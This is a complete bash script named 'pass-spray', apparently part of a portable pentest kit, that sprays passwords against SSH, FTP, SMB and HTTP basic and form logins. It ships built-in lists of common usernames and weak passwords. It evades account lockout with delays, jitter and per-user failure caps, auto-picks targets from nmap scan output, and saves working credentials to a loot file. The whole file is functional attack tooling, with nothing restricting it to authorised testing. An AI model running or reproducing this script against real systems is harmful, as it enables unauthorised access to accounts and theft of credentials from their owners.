#!/bin/bash
set -euo pipefail
# /usr/local/bin/pass-spray
# Lockout-aware password sprayer — SSH, HTTP-form, HTTP-basic, SMB, FTP
# Automatically discovers targets from loot/recon nmap XML if no target given.
#
# Usage: pass-spray <mode> <target> <users_file> <pass_file> [options]
#   mode       — ssh | http-form | http-basic | smb | ftp | auto
#   target     — IP or hostname (or 'auto' to read from last nmap scan)
#   users_file — one username per line (or 'common' for built-in list)
#   pass_file  — one password per line (or 'common' for built-in list)
#
# Options:
#   --delay <seconds>     Delay between attempts per user (default: 1)
#   --jitter <seconds>    Random jitter added to delay (default: 0)
#   --max-fails <n>       Stop spraying a user after N failures (default: 3)
#   --port <n>            Override service port
#   --form-url <url>      HTTP form POST URL (http-form mode)
#   --form-user <field>   Username field name (default: username)
#   --form-pass <field>   Password field name (default: password)
#   --success-str <str>   String in response indicating success (default: auto)
#   --threads <n>         Parallel threads (default: 1 — safe for lockout avoidance)
#   --spray               Rotate: try 1 password across ALL users before next password
#                         (default and recommended — reduces lockout risk)

LOOT="/opt/cardputer/loot/creds"
RECON="/opt/cardputer/loot/recon"
CONFIG="/opt/cardputer/config"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

RED='\033[0;31m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

mkdir -p "$LOOT"

# ── Built-in common lists ─────────────────────────────────────────────────────

COMMON_USERS="admin\nroot\nuser\ntest\nguest\noperator\nservice\nweb\napi\ndev\nadministrator\nsupport"
COMMON_PASSES="admin\npassword\n123456\npassword123\nadmin123\nletmein\nwelcome\nqwerty\nchangeme\ntest\nservice\ndefault\n1234\n12345678\nP@ssword\nP@ssw0rd\nAdmin1234"

# ── Helpers ───────────────────────────────────────────────────────────────────

log_ok()   { echo -e "${GREEN}[+]${NC} $*" | tee -a "$OUTFILE"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $*" | tee -a "$OUTFILE"; }
log_info() { echo -e "${CYAN}[*]${NC} $*" | tee -a "$OUTFILE"; }
log_err()  { echo -e "${RED}[!]${NC} $*" | tee -a "$OUTFILE"; }
log_cred() { echo -e "${GREEN}[CRED]${NC} $*" | tee -a "$OUTFILE" >> "$CREDS_FILE"; echo "$*" >> "$CREDS_FILE"; }

random_sleep() {
    local base=$1
    local jitter=${2:-0}
    if [ "$jitter" -gt 0 ]; then
        sleep "$(python3 -c "import random; print(${base} + random.uniform(0, ${jitter}))")"
    else
        sleep "$base"
    fi
}

auto_discover_targets() {
    local mode="$1"
    local port_map
    case "$mode" in
        ssh)       port_map="22" ;;
        ftp)       port_map="21" ;;
        smb)       port_map="445\|139" ;;
        http*)     port_map="80\|443\|8080\|8443" ;;
        *)         port_map="22\|21\|445\|80\|443" ;;
    esac

    # Parse latest nmap XML
    local xml
    xml=$(find "$RECON" -name "*.xml" 2>/dev/null | sort -t_ -k2 | tail -1)
    if [ -n "$xml" ]; then
        log_info "Auto-discovering from: $xml"
        python3 -c "
import xml.etree.ElementTree as ET, sys
tree = ET.parse(sys.argv[1])
ports = sys.argv[2].split('|')
for host in tree.findall('.//host'):
    state = host.find('.//status')
    if state is None or state.get('state') != 'up': continue
    addr = host.find('.//address[@addrtype=\"ipv4\"]')
    if addr is None: continue
    ip = addr.get('addr')
    for port in host.findall('.//port'):
        if port.get('portid') in ports:
            st = port.find('state')
            if st is not None and st.get('state') == 'open':
                print(ip)
                break
" "$xml" "$port_map" 2>/dev/null
    fi
}

# ── Mode functions ────────────────────────────────────────────────────────────

spray_ssh() {
    local target="$1" user="$2" pass="$3" port="${PORT:-22}"
    if ! command -v sshpass &>/dev/null; then
        log_err "sshpass not found: apt install sshpass"; exit 1
    fi
    local result
    result=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 -o BatchMode=no \
        -p "$port" "${user}@${target}" "echo OK" 2>&1)
    if echo "$result" | grep -q "^OK$"; then
        log_cred "SSH ${target}:${port}  ${user}:${pass}"
        return 0
    fi
    return 1
}

spray_ftp() {
    local target="$1" user="$2" pass="$3" port="${PORT:-21}"
    local result
    result=$(timeout 8 bash -c "echo -e 'USER ${user}\nPASS ${pass}\nQUIT' | \
        nc -w 5 '${target}' '${port}'" 2>/dev/null)
    if echo "$result" | grep -qE "^230 "; then
        log_cred "FTP ${target}:${port}  ${user}:${pass}"
        return 0
    fi
    return 1
}

spray_smb() {
    local target="$1" user="$2" pass="$3" port="${PORT:-445}"
    if ! command -v smbclient &>/dev/null; then
        log_err "smbclient not found: apt install smbclient"; exit 1
    fi
    local result
    result=$(smbclient -L "//${target}" -U "${user}%${pass}" -p "$port" 2>&1)
    if echo "$result" | grep -qv "NT_STATUS_LOGON_FAILURE\|NT_STATUS_ACCOUNT_LOCKED"; then
        if echo "$result" | grep -q "Sharename\|IPC\$"; then
            log_cred "SMB ${target}:${port}  ${user}:${pass}"
            # Check for locked accounts
            return 0
        fi
    fi
    if echo "$result" | grep -q "NT_STATUS_ACCOUNT_LOCKED"; then
        log_warn "LOCKED: $user on $target — stopping spray for this user"
        return 2
    fi
    return 1
}

spray_http_basic() {
    local target="$1" user="$2" pass="$3" port="${PORT:-80}"
    local proto="http"
    [ "$port" = "443" ] || [ "$port" = "8443" ] && proto="https"
    local url="${FORM_URL:-${proto}://${target}:${port}/}"
    local rc
    rc=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
        -u "${user}:${pass}" "$url")
    if [ "$rc" = "200" ] || [ "$rc" = "301" ] || [ "$rc" = "302" ]; then
        log_cred "HTTP-BASIC ${url}  ${user}:${pass}  (HTTP $rc)"
        return 0
    fi
    return 1
}

spray_http_form() {
    local target="$1" user="$2" pass="$3" port="${PORT:-80}"
    local proto="http"
    [ "$port" = "443" ] || [ "$port" = "8443" ] && proto="https"
    local url="${FORM_URL:-${proto}://${target}:${port}/login}"
    local user_field="${FORM_USER_FIELD:-username}"
    local pass_field="${FORM_PASS_FIELD:-password}"
    local success="${SUCCESS_STR:-dashboard\|logout\|welcome\|signed in\|authenticated}"

    local body
    body=$(curl -sk -L -o - --max-time 10 \
        -d "${user_field}=${user}&${pass_field}=${pass}" \
        -c "/tmp/spray_cookies_${RANDOM}.txt" "$url" 2>/dev/null)
    if echo "$body" | grep -iqE "$success"; then
        log_cred "HTTP-FORM ${url}  ${user}:${pass}"
        return 0
    fi
    return 1
}

# ── Main spray loop ───────────────────────────────────────────────────────────

run_spray() {
    local mode="$1" target="$2" users_src="$3" pass_src="$4"

    # Resolve user list
    local users_file="/tmp/spray_users_${TIMESTAMP}.txt"
    if [ "$users_src" = "common" ]; then
        printf "%b\n" "$COMMON_USERS" > "$users_file"
    elif [ -f "$users_src" ]; then
        cp "$users_src" "$users_file"
    else
        echo "$users_src" > "$users_file"
    fi

    # Resolve password list
    local pass_file="/tmp/spray_pass_${TIMESTAMP}.txt"
    if [ "$pass_src" = "common" ]; then
        printf "%b\n" "$COMMON_PASSES" > "$pass_file"
    elif [ -f "$pass_src" ]; then
        cp "$pass_src" "$pass_file"
    else
        echo "$pass_src" > "$pass_file"
    fi

    local total_users
    total_users=$(wc -l < "$users_file")
    local total_pass
    total_pass=$(wc -l < "$pass_file")
    local found=0
    local attempts=0

    log_info "Target: $target  Mode: $mode"
    log_info "Users: $total_users  Passwords: $total_pass  Delay: ${DELAY}s"
    log_info "Strategy: spray (1 password × all users before next password)"
    log_info "Output: $OUTFILE"
    echo ""

    # Spray mode: iterate passwords outer, users inner (1 pass per user before next)
    declare -A user_fails
    while IFS= read -r pass || [ -n "$pass" ]; do
        [[ -z "$pass" || "$pass" =~ ^# ]] && continue
        log_info "Trying password: $(echo "$pass" | head -c 3)***"

        while IFS= read -r user || [ -n "$user" ]; do
            [[ -z "$user" || "$user" =~ ^# ]] && continue

            # Skip if user hit lockout threshold
            local fails="${user_fails[$user]:-0}"
            if [ "$fails" -ge "$MAX_FAILS" ]; then
                continue
            fi

            attempts=$(( attempts + 1 ))
            local rc=1
            case "$mode" in
                ssh)        spray_ssh "$target" "$user" "$pass"; rc=$? ;;
                ftp)        spray_ftp "$target" "$user" "$pass"; rc=$? ;;
                smb)        spray_smb "$target" "$user" "$pass"; rc=$? ;;
                http-basic) spray_http_basic "$target" "$user" "$pass"; rc=$? ;;
                http-form)  spray_http_form "$target" "$user" "$pass"; rc=$? ;;
            esac

            if [ "$rc" -eq 0 ]; then
                found=$(( found + 1 ))
            elif [ "$rc" -eq 2 ]; then
                # Locked — skip this user entirely
                user_fails[$user]=$MAX_FAILS
            else
                user_fails[$user]=$(( fails + 1 ))
            fi

            random_sleep "$DELAY" "$JITTER"
        done < "$users_file"

        echo ""
    done < "$pass_file"

    echo ""
    log_info "Spray complete: $attempts attempts, $found credential(s) found"
    [ "$found" -gt 0 ] && log_ok "Credentials saved: $CREDS_FILE"
    rm -f "$users_file" "$pass_file"
}

# ── Arg parsing ───────────────────────────────────────────────────────────────

MODE="${1:-help}"
TARGET="${2:-}"
USERS="${3:-common}"
PASSES="${4:-common}"
shift 4 2>/dev/null || true

DELAY=1
JITTER=0
MAX_FAILS=3
PORT=""
FORM_URL=""
FORM_USER_FIELD="username"
FORM_PASS_FIELD="password"
SUCCESS_STR="dashboard|logout|welcome|signed in|authenticated"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --delay)        DELAY="$2";           shift 2 ;;
        --jitter)       JITTER="$2";          shift 2 ;;
        --max-fails)    MAX_FAILS="$2";       shift 2 ;;
        --port)         PORT="$2";            shift 2 ;;
        --form-url)     FORM_URL="$2";        shift 2 ;;
        --form-user)    FORM_USER_FIELD="$2"; shift 2 ;;
        --form-pass)    FORM_PASS_FIELD="$2"; shift 2 ;;
        --success-str)  SUCCESS_STR="$2";     shift 2 ;;
        *) shift ;;
    esac
done

OUTFILE="$LOOT/spray_${MODE}_${TIMESTAMP}.log"
CREDS_FILE="$LOOT/spray_creds_${TIMESTAMP}.txt"
touch "$OUTFILE" "$CREDS_FILE"

echo -e "${CYAN}"
echo "  ██████╗  █████╗ ███████╗███████╗    ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗"
echo "  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝"
echo "  ██████╔╝███████║███████╗███████╗    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ "
echo "  ██╔═══╝ ██╔══██║╚════██║╚════██║    ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  "
echo "  ██║     ██║  ██║███████║███████║    ███████║██║     ██║  ██║██║  ██║   ██║   "
echo "  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝  "
echo -e "${NC}"

case "$MODE" in
    ssh|ftp|smb|http-form|http-basic)
        if [ -z "$TARGET" ]; then
            echo -e "${RED}[!] Target required${NC}"
            exit 1
        fi
        run_spray "$MODE" "$TARGET" "$USERS" "$PASSES"
        ;;

    auto)
        log_info "Auto mode: discovering services from last nmap scan"
        for svc_mode in ssh ftp smb; do
            while IFS= read -r host; do
                [ -z "$host" ] && continue
                log_info "Auto-spray $svc_mode on $host"
                run_spray "$svc_mode" "$host" "$USERS" "$PASSES"
            done < <(auto_discover_targets "$svc_mode")
        done
        ;;

    *)
        echo "Usage: pass-spray <mode> <target> [users] [passwords] [options]"
        echo ""
        echo "Modes:"
        echo "  ssh          — SSH password spray (uses sshpass)"
        echo "  ftp          — FTP login spray"
        echo "  smb          — SMB/NTLM spray (uses smbclient)"
        echo "  http-basic   — HTTP Basic Auth spray"
        echo "  http-form    — HTTP POST login form spray"
        echo "  auto         — Auto-discover services from last nmap and spray all"
        echo ""
        echo "Arguments:"
        echo "  target   — IP/hostname, or 'auto' for nmap discovery"
        echo "  users    — user list file, or 'common' for built-in list"
        echo "  passwords — password list file, or 'common' for built-in list"
        echo ""
        echo "Options:"
        echo "  --delay <s>         Delay between attempts (default: 1)"
        echo "  --jitter <s>        Random jitter added to delay (default: 0)"
        echo "  --max-fails <n>     Stop a user after N failures (default: 3)"
        echo "  --port <n>          Override service port"
        echo "  --form-url <url>    POST URL for http-form mode"
        echo "  --form-user <f>     Username field name (default: username)"
        echo "  --form-pass <f>     Password field name (default: password)"
        echo "  --success-str <s>   Response string indicating login success"
        echo ""
        echo "Examples:"
        echo "  pass-spray ssh 192.168.1.1 common common --delay 2"
        echo "  pass-spray smb 192.168.1.100 users.txt passes.txt --jitter 1"
        echo "  pass-spray http-form 10.0.0.5 admin passes.txt --form-url http://10.0.0.5/login"
        echo "  pass-spray auto '' common common"
        exit 1
        ;;
esac
